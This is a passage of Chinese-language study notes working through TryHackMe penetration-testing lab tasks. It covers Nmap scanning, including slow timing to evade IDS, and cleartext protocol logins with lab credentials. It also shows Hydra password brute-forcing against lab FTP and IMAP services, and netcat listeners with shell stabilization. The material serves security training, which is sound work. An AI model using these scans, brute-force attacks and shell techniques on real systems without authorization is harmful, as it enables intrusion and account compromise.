<li>带有 <code>/16</code> 的子网，这意味着子网掩码可以写入 <code>255.255.0.0。</code>此子网可以有大约 65,000 台主机。</li>
<li>子网替换为 <code>/24</code> ，这表示子网掩码可以表示为 <code>255.255.255.0</code> 。此子网可以有大约 250 个主机。</li>
</ul>
<h4 id="Task2-枚举目标"><a href="#Task2-枚举目标" class="headerlink" title="Task2 枚举目标"></a>Task2 枚举目标</h4><p>如果您想检查 Nmap 将扫描的主机列表，您可以使用<code>-sL</code>参数。此选项将为您提供 Nmap 将扫描而不扫描的主机的详细列表</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913171729299.png"></p>
<h4 id="Task3-使用-ARP-的-Nmap-主机发现"><a href="#Task3-使用-ARP-的-Nmap-主机发现" class="headerlink" title="Task3 使用 ARP 的 Nmap 主机发现"></a>Task3 使用 ARP 的 Nmap 主机发现</h4><p>如果要使用 Nmap 来发现在线主机，而不对实时系统进行端口扫描，可以使用<code>-sn</code>参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PR -sn 10.10.210.6/24</span><br></pre></td></tr></table></figure>

<p>注：其中 <code>-PR</code> 表示只需要 ARP 扫描</p>
<h4 id="Task4-使用-ICMP-的-Nmap-主机发现"><a href="#Task4-使用-ICMP-的-Nmap-主机发现" class="headerlink" title="Task4 使用 ICMP 的 Nmap 主机发现"></a>Task4 使用 ICMP 的 Nmap 主机发现</h4><p>要使用 ICMP 回显请求来发现活动主机，使用参数<code>-PE</code> （如果不在后面进行端口扫描，添加<code>-sn</code> ）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PE -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<p>使用 ICMP 地址掩码查询发现活动主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PM -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<p>使用 ICMP 时间戳发现活动主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PP -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<h4 id="Task5-使用-TCP-和-UDP-的-Nmap-主机发现"><a href="#Task5-使用-TCP-和-UDP-的-Nmap-主机发现" class="headerlink" title="Task5 使用 TCP 和 UDP 的 Nmap 主机发现"></a>Task5 使用 TCP 和 UDP 的 Nmap 主机发现</h4><p>TCP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PS -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数：-PS&#x2F;PA  TCP SYN&#x2F;ACK</p>
</blockquote>
<p>UDP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -PU -sn 10.10.68.220/24</span><br></pre></td></tr></table></figure>

<h3 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h3><h4 id="Task1-TCP和UDP端口"><a href="#Task1-TCP和UDP端口" class="headerlink" title="Task1 TCP和UDP端口"></a>Task1 TCP和UDP端口</h4><blockquote>
<p>与 IP 地址指定网络上的主机以及其他主机一样，TCP 端口或 UDP 端口也用于标识该主机上运行的网络服务。服务器提供网络服务，并且遵循特定的网络协议。示例包括提供时间、响应 DNS 查询以及提供网页。端口通常使用该特定端口号链接到服务。例如， HTTP服务器默认绑定到 TCP 端口 80；此外，如果HTTP服务器支持 SSL&#x2F;TLS，它将侦听 TCP 端口 443。（TCP 端口 80 和 443 是HTTP和 HTTPS 的默认端口；但是，网络服务器管理员可以根据需要选择其他端口号。）此外，最多只有一个服务可以侦听任何 TCP 或UDP端口（同一 IP 地址）。</p>
</blockquote>
<p>冒着过于简单化的风险，我们可以将端口分为两种状态：</p>
<ol>
<li>打开端口表示有某个服务正在侦听该端口。</li>
<li>关闭端口表示该端口没有服务监听。</li>
</ol>
<p>但在实际情况中，我们需要考虑防火墙的影响。例如，端口可能是开放的，但防火墙可能会阻止数据包。因此， Nmap考虑以下六种状态：</p>
<ol>
<li><strong>Open</strong> ：表示有服务正在监听指定端口。</li>
<li><strong>Closed</strong> ：表示没有服务正在侦听指定端口，尽管该端口是可访问的。可访问是指它是可访问的并且不会被防火墙或其他安全设备&#x2F;程序阻止。</li>
<li><strong>Filtered</strong> ：表示Nmap无法确定端口是打开还是关闭，因为该端口不可访问。这种状态通常是由于防火墙阻止Nmap到达该端口造成的。 Nmap的数据包可能被阻止到达端口；或者，响应被阻止到达Nmap的主机。</li>
<li><strong>Unfiltered</strong> ：表示尽管端口可以访问，但Nmap无法确定端口是打开还是关闭。使用 ACK 扫描<code>-sA</code>时会遇到此状态。</li>
<li><strong>Open|Filtered</strong> ：这意味着Nmap无法确定端口是开放的还是已过滤的。</li>
<li><strong>Closed|Filtered</strong> ：这意味着Nmap无法决定端口是关闭还是过滤。</li>
</ol>
<h4 id="Task2-TCP连接扫描"><a href="#Task2-TCP连接扫描" class="headerlink" title="Task2 TCP连接扫描"></a>Task2 TCP连接扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT 10.10.10.2</span><br></pre></td></tr></table></figure>

<p>注：使用<code>-F</code>启用快速模式并将扫描端口的数量从 1000 个最常见端口减少到 100 个。</p>
<p>​		使用<code>-r</code>选项以连续顺序而不是随机顺序扫描端口。</p>
<p><strong>TCP SYN</strong></p>
<blockquote>
<p>TCP SYN 扫描是以特权用户身份运行 Nmap、以 root 身份运行或使用 sudo 运行 Nmap 时的默认扫描模式，它是一个非常可靠的选择。它已成功发现您之前通过TCP连接扫描找到的开放端口，但尚未与目标完全建立TCP连接。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 10.10.10.2</span><br></pre></td></tr></table></figure>

<h4 id="Task3-UDP连接扫描"><a href="#Task3-UDP连接扫描" class="headerlink" title="Task3 UDP连接扫描"></a>Task3 UDP连接扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sU 10.10.10.2</span><br></pre></td></tr></table></figure>

<h4 id="Task4-调整范围和性能"><a href="#Task4-调整范围和性能" class="headerlink" title="Task4 调整范围和性能"></a>Task4 调整范围和性能</h4><h5 id="扫描端口范围"><a href="#扫描端口范围" class="headerlink" title="扫描端口范围"></a>扫描端口范围</h5><p>您可以指定要扫描的端口，而不是默认的 1000 个端口。比如下面这样</p>
<ul>
<li>端口列表： <code>-p22,80,443</code>将扫描端口 22、80 和 443。</li>
<li>端口范围： <code>-p1-1023</code>将扫描 1 到 1023（含）之间的所有端口，而<code>-p20-25</code>将扫描 20 到 25（含）之间的端口。</li>
</ul>
<p>可以使用<code>-p-</code>请求扫描所有端口，这将扫描所有 65535 端口。如果要扫描最常见的 100 个端口，请添加<code>-F</code> 。使用<code>--top-ports 10</code>将检查十个最常见的端口。</p>
<h5 id="扫描速度"><a href="#扫描速度" class="headerlink" title="扫描速度"></a>扫描速度</h5><p>您可以使用<code>-T&lt;0-5&gt;</code>控制扫描时序。 <code>-T0</code>是最慢的（偏执），而<code>-T5</code>是最快的。</p>
<p>为了避免IDS警报，您可以考虑<code>-T0</code>或<code>-T1</code> 。例如， <code>-T0</code>一次扫描一个端口，并在发送每个探测之间等待 5 分钟，因此您可以猜测扫描一个目标需要多长时间才能完成。如果您不指定任何时间， Nmap将使用正常的<code>-T3</code> 。请注意， <code>-T5</code>就速度而言是最具侵略性的；但是，由于丢包的可能性增加，这可能会影响扫描结果的准确性。请注意， <code>-T4</code>通常在 CTF 期间和学习扫描练习目标时使用，而<code>-T1</code>通常在隐秘性更重要的真实交战中使用。</p>
<p>或者，您可以选择使用<code>--min-rate &lt;number&gt;</code>和<code>--max-rate &lt;number&gt;</code>控制数据包速率。例如， <code>--max-rate 10</code>或<code>--max-rate=10</code>可确保您的扫描仪每秒发送的数据包不超过 10 个。</p>
<h3 id="Nmap-后端口扫描"><a href="#Nmap-后端口扫描" class="headerlink" title="Nmap 后端口扫描"></a>Nmap 后端口扫描</h3><h4 id="Task1-服务检测"><a href="#Task1-服务检测" class="headerlink" title="Task1 服务检测"></a>Task1 服务检测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV MACHINE_IP</span><br></pre></td></tr></table></figure>

<h4 id="Task2-保存输出"><a href="#Task2-保存输出" class="headerlink" title="Task2 保存输出"></a>Task2 保存输出</h4><p>使用普通模式保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -sV -O -oN 1_scan 10.10.10.2</span><br></pre></td></tr></table></figure>

<h3 id="协议和服务1"><a href="#协议和服务1" class="headerlink" title="协议和服务1"></a>协议和服务1</h3><h4 id="Task1-telnet远程登录"><a href="#Task1-telnet远程登录" class="headerlink" title="Task1 telnet远程登录"></a>Task1 telnet远程登录</h4><p>Telnet 服务使用 Telnet 协议监听端口 23 上的传入连接。尽管 Telnet  使我们能够立即访问远程系统的终端，但它并不是一个可靠的远程管理协议，因为所有数据都以明文形式发送。下图中，我们捕获了Telnet产生的流量，很容易找到密码。下图显示了我们的计算机和远程系统之间交换的 ASCII  数据。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913233015796.png"></p>
<p>Telnet 不再被视为安全选项，尤其是任何捕获您的网络流量的人都将能够发现您的用户名和密码，这将授予他们访问远程系统的权限。安全的替代方案是SSH</p>
<h4 id="Task2-HTTP"><a href="#Task2-HTTP" class="headerlink" title="Task2 HTTP"></a>Task2 HTTP</h4><p>HTTP以明文形式发送和接收数据（未加密）；因此，您可以使用简单的工具，例如 Telnet（或 Netcat），与 Web 服务器通信并充当“Web 浏览器”。主要区别在于您需要输入HTTP相关命令，而不是 Web 浏览器为您执行此操作。</p>
<h4 id="Task3-FTP-文件传输协议"><a href="#Task3-FTP-文件传输协议" class="headerlink" title="Task3 FTP 文件传输协议"></a>Task3 FTP 文件传输协议</h4><p>文件传输协议（ FTP ）的开发是为了使不同系统的不同计算机之间的文件传输更加高效。FTP还以明文形式发送和接收数据；因此，我们可以使用Telnet（或Netcat）与FTP服务器通信并充当FTP客户端。默认监听端口为21。</p>
<p>利用给的用户名和密码进行ftp登录，get命令下载flag到本机</p>
<ul>
<li>Username: frank</li>
<li>Password: D2xc9CgD</li>
</ul>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240913234206931.png"></p>
<h4 id="Task4-SMTP-简单邮件传输协议"><a href="#Task4-SMTP-简单邮件传输协议" class="headerlink" title="Task4 SMTP 简单邮件传输协议"></a>Task4 SMTP 简单邮件传输协议</h4><p>简单邮件传输协议 (SMTP) 用于与MTA服务器进行通信。由于 SMTP 使用明文，所有命令均在不加密的情况下发送，因此我们可以使用基本的 Telnet 客户端连接到 SMTP 服务器并充当发送消息的电子邮件客户端 ( MUA )。SMTP服务器默认监听端口 25。</p>
<h4 id="Task5-POP3-邮局协议3"><a href="#Task5-POP3-邮局协议3" class="headerlink" title="Task5 POP3 邮局协议3"></a>Task5 POP3 邮局协议3</h4><p>POP3默认端口 110</p>
<p>用户通过提供用户名<code>USER frank</code>和密码<code>PASS D2xc9CgD</code>进行身份验证。使用命令<code>STAT</code> ，我们得到回复<code>+OK 1 179</code> ；根据<a href="https://datatracker.ietf.org/doc/html/rfc1939">RFC 1939</a> ，对<code>STAT</code>肯定响应格式为<code>+OK nn mm</code> ，其中<em>nn</em>是收件箱中的电子邮件数量， <em>mm</em>是收件箱的大小（以八位位组（字节）为单位）。命令<code>LIST</code>提供服务器上的新消息列表， <code>RETR 1</code>检索列表中的第一条消息。我们不需要费力去记住这些命令；不过，这有助于加强我们对此类协议的理解。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ip-10-10-7-230:~# telnet 10.10.202.102 110</span><br><span class="line">Trying 10.10.202.102...</span><br><span class="line">Connected to 10.10.202.102.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">+OK Hello there.</span><br><span class="line">USER frank</span><br><span class="line">+OK Password required.</span><br><span class="line">PASS D2xc9CgD</span><br><span class="line">+OK logged in.</span><br><span class="line">STAT</span><br><span class="line">+OK 1 179</span><br><span class="line">LIST</span><br><span class="line">+OK 1 messages (179) octets</span><br><span class="line">1 179</span><br><span class="line">.</span><br><span class="line">RETR 1</span><br><span class="line">+OK</span><br><span class="line">From: Mail Server </span><br><span class="line">To: Frank </span><br><span class="line">subject: Sending email with Telnet</span><br><span class="line">Hello Frank,</span><br><span class="line">I am just writing to say hi!</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">+OK 10.10.202.102 closing connection</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<h4 id="Task6-IMAP-互联网消息访问协议"><a href="#Task6-IMAP-互联网消息访问协议" class="headerlink" title="Task6 IMAP 互联网消息访问协议"></a>Task6 IMAP 互联网消息访问协议</h4><p>Internet 消息访问协议 (IMAP) 比 POP3 更复杂。 IMAP 可以让您的电子邮件在多个设备（和邮件客户端）之间保持同步。换句话说，如果您在智能手机上检查电子邮件时将电子邮件标记为已读，则更改将保存在 IMAP 服务器 ( MDA ) 上，并在同步收件箱时复制到您的笔记本电脑上。默认端口为143</p>
<p>很明显， IMAP以明文形式发送登录凭据，正如我们在命令<code>LOGIN frank D2xc9CgD</code>中看到的那样。任何观察网络流量的人都能够知道弗兰克的用户名和密码。</p>
<h4 id="Task7-总结"><a href="#Task7-总结" class="headerlink" title="Task7 总结"></a>Task7 总结</h4><table>
<thead>
<tr>
<th>协议</th>
<th>TCP端口</th>
<th>申请</th>
<th>数据安全</th>
</tr>
</thead>
<tbody><tr>
<td>FTP</td>
<td>21</td>
<td>文件传输</td>
<td>明文</td>
</tr>
<tr>
<td>HTTP</td>
<td>80</td>
<td>全球资讯网</td>
<td>明文</td>
</tr>
<tr>
<td>IMAP</td>
<td>143</td>
<td>电子邮件 ( MDA )</td>
<td>明文</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
<td>电子邮件 ( MDA )</td>
<td>明文</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
<td>电子邮件 ( MTA )</td>
<td>明文</td>
</tr>
<tr>
<td>远程登录</td>
<td>23</td>
<td>远程访问</td>
<td>明文</td>
</tr>
</tbody></table>
<h3 id="协议和服务2"><a href="#协议和服务2" class="headerlink" title="协议和服务2"></a>协议和服务2</h3><h4 id="Task1-嗅探攻击"><a href="#Task1-嗅探攻击" class="headerlink" title="Task1 嗅探攻击"></a>Task1 嗅探攻击</h4><blockquote>
<p>嗅探攻击是指利用网络抓包工具来收集目标的信息。当协议以明文方式通信时，第三方可以捕获交换的数据进行分析。如果数据在传输过程中未加密，则简单的网络数据包捕获可能会泄露信息，例如私人消息的内容和登录凭据。</p>
</blockquote>
<p>只要用户具有适当的权限（ Linux上的 root 权限和 MS Windows 上的管理员权限），就可以使用以太网 (802.3) 网卡进行嗅探攻击。有许多程序可用于捕获网络数据包。我们考虑以下几点：</p>
<ol>
<li><strong>Tcpdump</strong>是一个免费的开源命令行界面 ( CLI ) 程序，已被移植到许多操作系统上。</li>
<li><strong>Wireshark</strong>是一款免费的开源图形用户界面 (GUI) 程序，适用于多种操作系统，包括Linux 、macOS 和 MS Windows。</li>
<li><strong>Tshark</strong>是 Wireshark 的CLI替代品。</li>
</ol>
<p>数据包捕获需要sudo权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump port 110 -A</span><br></pre></td></tr></table></figure>

<p>注：<code>-A</code>作用是以 ASCII 格式显示捕获的数据包的内容</p>
<h4 id="Task2-中间人-MITM-攻击"><a href="#Task2-中间人-MITM-攻击" class="headerlink" title="Task2 中间人 (MITM) 攻击"></a>Task2 中间人 (MITM) 攻击</h4><p>当受害者 (A) 认为自己正在与合法目的地 (B) 通信，但在不知不觉中与攻击者 (E) 通信时，就会发生中间人 ( MITM ) 攻击。下图中，我们有A请求向M转账20美元；然而，E 更改了该消息并用新值替换了原始值。 B 收到修改后的消息并对其采取行动。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914093552312.png"></p>
<p>MITM还会影响其他明文协议，例如 FTP、SMTP 和 POP3。缓解这种攻击需要使用密码学。解决方案在于正确的身份验证以及交换消息的加密或签名。借助公钥基础设施 (PKI) 和受信任的根证书，传输层安全 (TLS) 可以防止MITM攻击。</p>
<p>可以用来进行中间人攻击的工具，例如<a href="https://www.ettercap-project.org/">Ettercap</a>和<a href="https://www.bettercap.org/">Bettercap</a> </p>
<h4 id="Task3-传输层安全-TLS"><a href="#Task3-传输层安全-TLS" class="headerlink" title="Task3 传输层安全 (TLS)"></a>Task3 传输层安全 (TLS)</h4><p>可以防止密码嗅探和MITM攻击，现有的明文协议可以升级为使用 SSL&#x2F;TLS 加密。我们可以使用 TLS 来升级HTTP 、 FTP 、 SMTP 、 POP3 和IMAP等。下表列出了我们涵盖的协议及其通过 SSL&#x2F;TLS 加密升级前后的默认端口。</p>
<table>
<thead>
<tr>
<th>Protocol 协议</th>
<th>Default Port 默认端口</th>
<th>Secured Protocol 安全协议</th>
<th>Default Port with TLS 带 TLS 的默认端口</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP</td>
<td>80</td>
<td>HTTPS</td>
<td>443</td>
</tr>
<tr>
<td>FTP</td>
<td>21</td>
<td>FTPS</td>
<td>990</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
<td>SMTPS</td>
<td>465</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
<td>POP3S</td>
<td>995</td>
</tr>
<tr>
<td>IMAP</td>
<td>143</td>
<td>IMAPS</td>
<td>993</td>
</tr>
</tbody></table>
<p>为了使 SSL&#x2F;TLS 有效，尤其是通过 HTTPS 浏览网页时，我们依赖于我们系统信任的证书颁发机构签署的公共证书。换句话说，当我们通过 HTTPS 浏览<a href="https://tryhackme.com/">TryHackMe</a>时，我们的浏览器期望 TryHackMe Web 服务器提供来自受信任证书颁发机构的签名证书，如下例所示。这样，我们的浏览器就可以确保它与正确的服务器进行通信，并且不会发生MITM攻击。</p>
<h4 id="Task4-安全外壳-SSH"><a href="#Task4-安全外壳-SSH" class="headerlink" title="Task4 安全外壳 (SSH)"></a>Task4 安全外壳 (SSH)</h4><p>我们可以使用SSH来传输文件，在SSH协议的基础上使用SCP（Secure Copy Protocol），示例如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp mark@10.10.224.115:/home/mark/book.txt ~</span><br></pre></td></tr></table></figure>

<p> 该命令将从位于<code>/home/mark</code>目录的远程系统中名为<code>book.txt</code>的文件复制到<code>~</code> ，即当前登录用户的主目录的根目录。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914094842847.png"></p>
<p>也可以将本地文件复制到ssh连接的远程系统上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp backup.tar.bz2 mark@10.10.224.115:/home/mark/</span><br></pre></td></tr></table></figure>

<p>此命令会将文件<code>backup.tar.bz2</code>从本地系统复制到远程系统上的目录<code>/home/mark/</code> </p>
<h4 id="Task5-密码攻击"><a href="#Task5-密码攻击" class="headerlink" title="Task5 密码攻击"></a>Task5 密码攻击</h4><p>Hydra 支持许多协议，包括 FTP、POP3、IMAP、SMTP、SSH 以及所有与HTTP相关的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l username -P wordlist.txt server service</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>-l username</code> ： <code>-l</code>应位于<code>username</code>之前，即目标的登录名。</p>
</li>
<li><p><code>-P wordlist.txt</code> ：-P 位于<code>wordlist.txt</code>文件之前， <code>-P</code>文件是一个文本文件，其中包含您要使用提供的用户名尝试的密码列表。</p>
</li>
<li><p><code>server</code>是目标服务器的主机名或 IP 地址。</p>
</li>
<li><p><code>service</code>表示您尝试发起字典攻击的服务。</p>
</li>
<li><p><code>-s PORT</code>为相关服务指定非默认端口。</p>
</li>
<li><p><code>-V</code>或<code>-vV</code>表示详细信息，使Hydra显示正在尝试的用户名和密码组合。这种冗长的内容非常方便查看进度，特别是如果您对自己的命令行语法仍然没有信心的话。</p>
</li>
<li><p><code>-tn</code>其中 n 是目标的并行连接数。 <code>-t 16</code>将创建 16 个线程用于连接到目标。</p>
</li>
<li><p><code>-d</code> ，用于调试，以获得有关正在发生的情况的更多详细信息。调试输出可以让你省去很多挫败感；例如，如果Hydra尝试连接到一个关闭的端口并超时， <code>-d</code>将立即显示这一点。</p>
</li>
</ul>
<p>假设得到某个电子邮件帐户是<code>lazie</code> ，尝试得到用于访问 10.10.224.115 上的 IMAP 服务的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.224.115 imap</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914095538246.png"></p>
<h3 id="网络安全挑战"><a href="#网络安全挑战" class="headerlink" title="网络安全挑战"></a>网络安全挑战</h3><h4 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 10.10.58.189</span><br></pre></td></tr></table></figure>

<p>扫出来小于10000的最大开放端口为8080</p>
<h4 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p1-20000 -v 10.10.58.189</span><br></pre></td></tr></table></figure>

<p>得到大于10000端口的10021</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914144745279.png"></p>
<h4 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 10.10.58.189 -sT -v -p1-20000</span><br></pre></td></tr></table></figure>

<p>打开了6个 TCP 端口</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914144925015.png"></p>
<h4 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h4><p>使用telnet连接靶机的80端口，然后传入以下内容按两下enter发送</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">host: test</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145249246.png"></p>
<h4 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h4><p>连接ssh的默认端口22</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145517418.png"></p>
<h4 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h4><p>刚刚扫描有个未知服务的端口10021，连接得到FTP版本信息</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914145924414.png"></p>
<h4 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h4><p>由于不是默认端口，使用<code>-s</code>参数指定端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.10.58.189 ftp -s 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914151555644.png"></p>
<p>得到用户名和密码，不过ftp服务器连上去拿不到flag。爆破另外一个用户名密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.10.58.189 ftp -s 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914152157163.png"></p>
<p>连接ftp，下载拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 10.10.58.189 10021</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240914152430632.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h3><h4 id="Task1-shell类型"><a href="#Task1-shell类型" class="headerlink" title="Task1 shell类型"></a>Task1 shell类型</h4><p>在高层次上，我们对利用目标的两种 shell 感兴趣：反向 shell 和绑定 shell。</p>
<ul>
<li><strong>反向 shell</strong>是指目标被迫执行连接<em>回</em>您的计算机的代码。在您自己的计算机上，您将使用上一个任务中提到的工具之一来设置用于接收连接的<em>侦听器</em>。反向 shell 是绕过防火墙规则的好方法，这些规则可能会阻止您连接到目标上的任意端口；但是，缺点是，当通过互联网从计算机接收 shell  时，您需要配置自己的网络以接受 shell。然而，由于我们连接网络的方法，这在 TryHackMe 网络上不会成为问题。</li>
<li><strong>绑定 shell</strong>是指在目标上执行的代码用于启动附加到直接在目标上的 shell 的侦听器。然后，这将向互联网开放，这意味着您可以连接到代码已打开的端口并以这种方式获得远程代码执行。这样做的优点是不需要在您自己的网络上进行任何配置，但可能会被保护目标的防火墙阻止。</li>
</ul>
<h4 id="Task2-netcat"><a href="#Task2-netcat" class="headerlink" title="Task2 netcat"></a>Task2 netcat</h4><p>如前所述，当涉及任何类型的网络时，Netcat 是渗透测试人员工具包中最基本的工具。有了它，我们可以做各种各样有趣的事情，但现在让我们关注 shell。</p>
<p> <em>反向shell</em></p>
<p>在上一个任务中，我们看到反向 shell 需要 shellcode 和侦听器。执行 shell 的方法有<em>很多种</em>，因此我们将从查看侦听器开始。</p>
<p>使用Linux启动 netcat 侦听器的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp &lt;port-number&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>-l</strong>用于告诉 netcat 这将是一个侦听器</li>
<li><strong>-v</strong>用于请求详细输出</li>
<li><strong>-n</strong>告诉 netcat 不要解析主机名或使用DNS 。解释这一点超出了房间的范围。</li>
<li><strong>-p</strong>表示将遵循端口规范。</li>
</ul>
<p>上一个任务中的示例使用端口 443。实际上，您可以使用您喜欢的任何端口，只要还没有服务使用它即可。请注意，如果您选择使用低于 1024 的端口，则在启动侦听器时需要使用<code>sudo</code> 。也就是说，使用众所周知的端口号（80、443 或 53 是不错的选择）通常是一个好主意，因为这更有可能通过目标上的出站防火墙规则。</p>
<p>一个可行的例子是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>

<p>然后，我们可以使用任意数量的有效负载连接回此，具体取决于目标上的环境。</p>
<p>上一个任务中显示了这样的示例。</p>
<p> <em>绑定shell</em></p>
<p>如果我们希望在目标上获得绑定 shell，那么我们可以假设目标的选定端口上已经有一个侦听器在等待我们：我们需要做的就是连接到它。其语法相对简单：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc &lt;target-ip&gt; &lt;chosen-port&gt;</span><br></pre></td></tr></table></figure>

<p>在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。</p>
<p>我们将在任务 8 中了解如何使用 netcat 为此类 shell 创建侦听器。这里重要的是您了解如何使用 netcat 连接到侦听端口。</p>
<h4 id="Task3-netcat-稳定shell"><a href="#Task3-netcat-稳定shell" class="headerlink" title="Task3 netcat 稳定shell"></a>Task3 netcat 稳定shell</h4><p>默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会杀死整个事情。它们是非交互式的，并且经常出现奇怪的格式错误。这是因为 netcat“shell”实际上是在终端<em>内</em>运行的进程，而不是其本身的真正终端。幸运的是，有很多方法可以在 Linux 系统上稳定 netcat shell。我们将在这里关注三个。 Windows 反向 shell 的稳定往往要困难得多；然而，我们将在这里介绍的第二种技术对此特别有用。</p>
<p><strong>方法一</strong></p>
<p>我们将讨论的第一种技术仅适用于Linux机器，因为它们几乎总是默认安装 Python。这是一个三阶段过程：</p>
<ol>
<li>首先要做的是使用 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> ，它使用 Python 生成功能更好的 bash shell；请注意，某些目标可能需要指定的 Python 版本。如果是这种情况，请根据需要将<code>python</code>替换为<code>python2</code>或<code>python3</code> 。此时，我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 自动完成或箭头键，并且 Ctrl + C 仍然会终止 shell。</li>
<li>第二步是： <code>export TERM=xterm</code>这将使我们能够访问术语命令，例如<code>clear</code> 。</li>
<li>最后（也是最重要的）我们将使用 Ctrl + Z 将 shell 置于后台。回到我们自己的终端，我们使用<code>stty raw -echo; fg</code>这做了两件事：首先，它关闭了我们自己的终端回显（这使我们能够访问选项卡自动完成、箭头键和 Ctrl + C 来终止进程）。然后它将 shell 置于前台，从而完成该过程。</li>
</ol>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917165526113.png"></p>
<p>请注意，如果 shell 死机，您自己的终端中的任何输入都将不可见（由于禁用了终端回显）。要解决此问题，请输入<code>reset</code>并按 Enter 键。</p>
<p><strong>方法二</strong></p>
<p>rlwrap 是一个程序，简单来说，它让我们在收到 shell 后立即访问历史记录、制表符自动完成和箭头键<em>；</em>但是，如果您希望能够在 shell 内使用 Ctrl + C，则仍然必须使用<em>一些</em>手动稳定功能。 Kali 上默认没有安装 rlwrap，因此首先使用<code>sudo apt install rlwrap</code>安装它。</p>
<p>要使用 rlwrap，我们调用一个略有不同的侦听器：</p>
